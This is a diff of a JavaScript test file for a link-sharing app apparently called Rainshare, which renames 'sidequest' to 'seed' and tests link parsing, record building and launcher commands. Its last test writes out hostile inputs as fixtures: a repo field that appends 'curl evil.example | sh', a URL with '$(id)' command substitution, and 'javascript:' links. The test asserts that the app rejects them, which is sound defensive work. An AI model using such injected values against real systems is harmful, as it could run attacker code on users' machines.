@@ -1,7 +1,7 @@
 // Run with: npm test (node --test, no dependencies)
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { SIDEQUEST } from '../core/ns.js';
+import { SEED } from '../core/ns.js';
 import { parseSubject, describeSubject, cloneUrlOf } from '../core/subjects.js';
 import * as R from '../core/records.js';
 import { meantFor, closeness } from '../core/circle.js';
@@ -14,15 +14,15 @@ import { splitSpaceUri } from '../core/source.js';
 
 test('parses GitHub, Tangled and other links into subjects', () => {
   const gi = parseSubject('https://github.com/dame-is/atmosphere-online/issues/42');
-  assert.equal(gi.$type, SIDEQUEST + '#githubIssue');
+  assert.equal(gi.$type, SEED + '#githubIssue');
   assert.equal(gi.repo, 'dame-is/atmosphere-online'); assert.equal(gi.number, 42);
   assert.equal(cloneUrlOf(gi), 'https://github.com/dame-is/atmosphere-online.git');
 
   const gr = parseSubject('https://github.com/dame-is/atmosphere-online.git');
-  assert.equal(gr.$type, SIDEQUEST + '#repo'); assert.equal(gr.name, 'dame-is/atmosphere-online');
+  assert.equal(gr.$type, SEED + '#repo'); assert.equal(gr.name, 'dame-is/atmosphere-online');
 
   const ti = parseSubject('https://tangled.org/@dame.is/garden/issues/7');
-  assert.equal(ti.$type, SIDEQUEST + '#tangledIssue');
+  assert.equal(ti.$type, SEED + '#tangledIssue');
   assert.equal(ti.repoUrl, 'https://tangled.org/dame.is/garden');
   assert.equal(describeSubject(ti).label, 'dame.is/garden #7');
   assert.equal(cloneUrlOf(ti), 'https://tangled.org/dame.is/garden');
@@ -36,21 +36,21 @@ test('parses GitHub, Tangled and other links into subjects', () => {
   assert.equal(parseSubject('javascript:alert(1)'), null);
 });
 
-test('builds sidequests with sensible defaults and limits', () => {
-  assert.throws(() => R.sidequest({ title: '  ' }), /title/);
-  const r = R.sidequest({ title: 'x'.repeat(200), tags: 'Rust, CLI tools, rust', audience: 'nonsense' });
+test('builds seeds with sensible defaults and limits', () => {
+  assert.throws(() => R.seed({ title: '  ' }), /title/);
+  const r = R.seed({ title: 'x'.repeat(200), tags: 'Rust, CLI tools, rust', audience: 'nonsense' });
   assert.equal([...r.title].length, 120);
   assert.deepEqual(r.tags, ['rust', 'cli-tools']);
-  assert.equal(r.audience.$type, SIDEQUEST + '#mutuals');
+  assert.equal(r.audience.$type, SEED + '#mutuals');
   assert.ok(r.createdAt && !r.updatedAt && !r.state);
-  assert.throws(() => R.sidequest({ title: 't', audience: 'list' }), /list/);
-  const g = R.sidequest({ title: 't', group: 'did:plc:group' });
-  assert.deepEqual(g.audience, { $type: SIDEQUEST + '#group', group: 'did:plc:group' });
-  const w = R.sidequest({ title: 't', wants: { models: ['claude-opus-5-5', ''], tests: 'required', maxDiffLines: '300' }, specUrl: 'javascript:alert(1)' });
+  assert.throws(() => R.seed({ title: 't', audience: 'list' }), /list/);
+  const g = R.seed({ title: 't', group: 'did:plc:group' });
+  assert.deepEqual(g.audience, { $type: SEED + '#group', group: 'did:plc:group' });
+  const w = R.seed({ title: 't', wants: { models: ['claude-opus-5-5', ''], tests: 'required', maxDiffLines: '300' }, specUrl: 'javascript:alert(1)' });
   assert.deepEqual(w.wants, { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 300 });
   assert.equal(w.specUrl, undefined);
-  const edited = R.sidequest({ title: 'new' }, { createdAt: '2026-01-01T00:00:00.000Z', state: 'cleared' });
-  assert.equal(edited.createdAt, '2026-01-01T00:00:00.000Z'); assert.equal(edited.state, 'cleared'); assert.ok(edited.updatedAt);
+  const edited = R.seed({ title: 'new' }, { createdAt: '2026-01-01T00:00:00.000Z', state: 'sprouted' });
+  assert.equal(edited.createdAt, '2026-01-01T00:00:00.000Z'); assert.equal(edited.state, 'sprouted'); assert.ok(edited.updatedAt);
 });
 
 test('profiles keep private fields out of the public copy', () => {
@@ -63,17 +63,17 @@ test('profiles keep private fields out of the public copy', () => {
   assert.equal(pub.budget, undefined); assert.equal(pub.circumstances, undefined); assert.deepEqual(pub.values, p.values);
 });
 
-test('takes and deliveries need a real sidequest and a link', () => {
-  assert.throws(() => R.take({ sidequest: { uri: 'at://x' } }), /found/);
-  const t = R.take({ sidequest: { uri: 'at://a/b/c', cid: 'bafy' }, setup: { harness: 'codex', models: ['gpt-5-codex'] } });
-  assert.deepEqual(t.sidequest, { uri: 'at://a/b/c', cid: 'bafy' });
-  assert.throws(() => R.delivery({ sidequest: { uri: 'at://a/b/c', cid: 'bafy' } }), /pull request/);
-  const d = R.delivery({ sidequest: { uri: 'at://a/b/c', cid: 'bafy' }, url: 'https://github.com/o/r/pull/1', sessionUrl: 'ftp://nope' });
+test('takes and deliveries need a real seed and a link', () => {
+  assert.throws(() => R.take({ seed: { uri: 'at://x' } }), /found/);
+  const t = R.take({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, setup: { harness: 'codex', models: ['gpt-5-codex'] } });
+  assert.deepEqual(t.seed, { uri: 'at://a/b/c', cid: 'bafy' });
+  assert.throws(() => R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' } }), /pull request/);
+  const d = R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, url: 'https://github.com/o/r/pull/1', sessionUrl: 'ftp://nope' });
   assert.equal(d.url, 'https://github.com/o/r/pull/1'); assert.equal(d.sessionUrl, undefined);
 });
 
-test('audiences decide who a sidequest is meant for', () => {
-  const rec = a => ({ audience: { $type: `${SIDEQUEST}#${a}`, ...(a === 'list' ? { list: 'at://x/app.bsky.graph.list/1' } : {}) } });
+test('audiences decide who a seed is meant for', () => {
+  const rec = a => ({ audience: { $type: `${SEED}#${a}`, ...(a === 'list' ? { list: 'at://x/app.bsky.graph.list/1' } : {}) } });
   const base = { viewer: 'did:me', author: 'did:them' };
   const mutual = { following: true, followedBy: true }, theyFollow = { followedBy: true }, iFollow = { following: true };
   assert.equal(meantFor(rec('anyone'), { ...base, viewer: null }), true);
@@ -107,7 +107,7 @@ test('ranking puts the people a helper prioritises first, and says why', () => {
   assert.ok(taken.reasons.some(r => r.text === 'Someone’s on it'));
 });
 
-test('fit says how well a sidequest suits a helper, in one sentence', () => {
+test('fit says how well a seed suits a helper, in one sentence', () => {
   const me = { did: 'did:me', profile: { priorities: ['low-budget', 'students'], values: ['accessibility'], offering: ['css'], setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] } };
   const strong = fit({ closeness: 'mutual', author: { displayName: 'Juniper Hale' }, value: { tags: ['css'], values: ['accessibility'], wants: { models: ['claude-sonnet-5-5'] } }, profile: { budget: 'none', circumstances: ['student'] } }, me);
   assert.equal(strong.level, 3); assert.equal(strong.label, 'Strong fit');
@@ -120,10 +120,10 @@ test('fit says how well a sidequest suits a helper, in one sentence', () => {
   assert.ok(rank([{ closeness: 'mutual', value: {} }], me)[0].fit.label);
 });
 
-test('a sidequest reads as plain lines, not chips', () => {
-  const sq = { title: 't', size: 'small', parallel: true, subject: { $type: SIDEQUEST + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 }, wants: { tests: 'required', maxDiffLines: 200, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], harnesses: ['claude-code'], notes: 'No new dependencies' } };
+test('a seed reads as plain lines, not chips', () => {
+  const sq = { title: 't', size: 'small', parallel: true, subject: { $type: SEED + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 }, wants: { tests: 'required', maxDiffLines: 200, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], harnesses: ['claude-code'], notes: 'No new dependencies' } };
   assert.equal(whereText(sq), 'GitHub issue #14, o/r'); assert.equal(shortWhere(sq), 'GitHub #14');
-  assert.equal(whereText({ subject: { $type: SIDEQUEST + '#tangledIssue', url: 'https://tangled.org/kai.example/almanac/issues/88', repoUrl: 'https://tangled.org/kai.example/almanac' } }), 'Tangled issue #88, kai.example/almanac');
+  assert.equal(whereText({ subject: { $type: SEED + '#tangledIssue', url: 'https://tangled.org/kai.example/almanac/issues/88', repoUrl: 'https://tangled.org/kai.example/almanac' } }), 'Tangled issue #88, kai.example/almanac');
   assert.equal(whereText({}), 'No repo yet');
   assert.equal(jobText(sq), 'Small. Tests required. Under about 200 lines. More than one helper can try.');
   assert.equal(jobShort(sq), 'small job, tests required'); assert.equal(jobText({}), 'Not said.');
@@ -151,7 +151,7 @@ test('markdown is escaped, with only safe constructs turned back on', () => {
 });
 
 test('the brief frames the request and the launchers paste as one command', () => {
-  const item = { uri: 'at://did:plc:abc/dev.rainshare.sidequest/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: {
+  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: {
     title: 'Fix it', spec: 'Please fix RAINSHARE_BRIEF things', subject: parseSubject('https://github.com/o/r/issues/5'),
     wants: { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 100 } } };
   const b = brief(item);
@@ -169,9 +169,9 @@ test('the brief frames the request and the launchers paste as one command', () =
 });
 
 test('a space record URI splits into its space and record', () => {
-  assert.deepEqual(splitSpaceUri('at://did:plc:g/space/dev.rainshare.board/rainshare/did:plc:me/dev.rainshare.sidequest/3k1'),
-    { space: 'at://did:plc:g/space/dev.rainshare.board/rainshare', repo: 'did:plc:me', collection: 'dev.rainshare.sidequest', rkey: '3k1' });
-  assert.equal(splitSpaceUri('at://did:plc:me/dev.rainshare.sidequest/3k1'), null);
+  assert.deepEqual(splitSpaceUri('at://did:plc:g/space/dev.rainshare.board/rainshare/did:plc:me/dev.rainshare.seed/3k1'),
+    { space: 'at://did:plc:g/space/dev.rainshare.board/rainshare', repo: 'did:plc:me', collection: 'dev.rainshare.seed', rkey: '3k1' });
+  assert.equal(splitSpaceUri('at://did:plc:me/dev.rainshare.seed/3k1'), null);
 });
 
 test('the example circle answers like the real source', async () => {
@@ -184,34 +184,34 @@ test('the example circle answers like the real source', async () => {
   const juniper = items.find(i => i.rkey === '3sq-juniper');
   await src.take(juniper, { setup: { harness: 'claude-code', models: ['claude-sonnet-5-5'] } });
   await src.turnIn(juniper, { url: 'https://github.com/example/flashdeck/pull/15' });
-  const again = await src.sidequest(juniper.uri);
+  const again = await src.seed(juniper.uri);
   assert.equal(again.takes.length, 1); assert.equal(again.deliveries.length, 1);
-  const posted = await src.post({ title: 'My own', audience: 'anyone' });
+  const posted = await src.plant({ title: 'My own', audience: 'anyone' });
   assert.ok((await src.board()).items.some(i => i.uri === posted.uri && i.closeness === 'self'));
   // A private one goes into whichever group you pick, once that group has Rainshare.
   const hackers = (await src.groups()).find(g => g.name === 'Weekend Hackers');
   assert.equal(hackers.space, null);
   await src.addToGroup(hackers.did);
-  const priv = await src.post({ title: 'Weekend project' }, { group: hackers.did });
+  const priv = await src.plant({ title: 'Weekend project' }, { group: hackers.did });
   assert.match(priv.uri, /^at:\/\/did:example:hackers\/space\//);
   const mineNow = (await src.board()).items.find(i => i.uri === priv.uri);
   assert.equal(mineNow.group.name, 'Weekend Hackers'); assert.equal(mineNow.value.audience.group, hackers.did);
   const fresh = createDemoSource({ store });
-  assert.equal((await fresh.sidequest(juniper.uri)).deliveries.length, 1);
+  assert.equal((await fresh.seed(juniper.uri)).deliveries.length, 1);
 });
 
 test('records from other people can’t smuggle links or shell into the page or a command', () => {
-  const evil = { uri: "at://did:plc:abc/dev.rainshare.sidequest/3k1", repo: 'did:plc:abc', author: { handle: 'x.example' }, value: { title: 't', subject: { $type: SIDEQUEST + '#githubIssue', url: 'javascript:alert(1)', repo: 'o/r; curl evil.example | sh', number: 1 } } };
+  const evil = { uri: "at://did:plc:abc/dev.rainshare.seed/3k1", repo: 'did:plc:abc', author: { handle: 'x.example' }, value: { title: 't', subject: { $type: SEED + '#githubIssue', url: 'javascript:alert(1)', repo: 'o/r; curl evil.example | sh', number: 1 } } };
   const d = describeSubject(evil.value.subject);
   assert.equal(d.href, null); assert.equal(d.repo, null);
   assert.equal(cloneUrlOf(evil.value.subject), null);
   const ls = launchers(evil);
   assert.deepEqual(ls.map(l => l.id), ['cli', 'mcp']);
-  assert.match(ls[0].command, /run 'at:\/\/did:plc:abc\/dev\.rainshare\.sidequest\/3k1'$/);
-  const repo = { $type: SIDEQUEST + '#repo', url: "https://x.example/r'$(id)", forge: 'other' };
+  assert.match(ls[0].command, /run 'at:\/\/did:plc:abc\/dev\.rainshare\.seed\/3k1'$/);
+  const repo = { $type: SEED + '#repo', url: "https://x.example/r'$(id)", forge: 'other' };
   assert.equal(cloneUrlOf(repo), null);
-  assert.equal(cloneUrlOf({ $type: SIDEQUEST + '#repo', url: 'https://codeberg.org/a/b', forge: 'codeberg' }), 'https://codeberg.org/a/b');
-  const tangled = { $type: SIDEQUEST + '#tangledIssue', url: 'https://tangled.org/a/b/issues/2', repoUrl: 'https://tangled.org/a/b' };
+  assert.equal(cloneUrlOf({ $type: SEED + '#repo', url: 'https://codeberg.org/a/b', forge: 'codeberg' }), 'https://codeberg.org/a/b');
+  const tangled = { $type: SEED + '#tangledIssue', url: 'https://tangled.org/a/b/issues/2', repoUrl: 'https://tangled.org/a/b' };
   const cmd = launchers({ ...evil, value: { title: 't', subject: tangled } }).find(l => l.id === 'claude').command;
-  assert.match(cmd, /^git clone 'https:\/\/tangled\.org\/a\/b' sidequest-/);
+  assert.match(cmd, /^git clone 'https:\/\/tangled\.org\/a\/b' seed-/);
 });
